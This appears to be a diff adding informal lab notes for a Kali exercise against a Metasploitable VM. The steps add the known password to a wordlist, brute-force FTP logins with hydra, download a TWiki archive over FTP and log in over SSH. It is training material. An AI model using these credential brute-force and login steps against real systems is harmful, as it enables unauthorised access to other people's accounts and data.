@@ -1,0 +1,30 @@
+in kali
+1
+locate unix_passwords.txt
+after that copy second path form the output
+
+2
+sudo nano copied path
+add msfadmin pass in that 
+ 
+ 3
+ hydra -l msfadmin -P "copied path" ftp://metaspoiltable_ip
+
+ 4
+ cd downloads
+
+5
+ftp metaspoiltable_ip
+
+6
+cd vulnerable
+
+7
+cd twiki20030201
+
+8
+get tWiki20030201.tar.gz
+
+9
+ssh -o "HostKeyAlgorithms ssh-rsa" msfadmin@metaspoiltable_IP
+completed
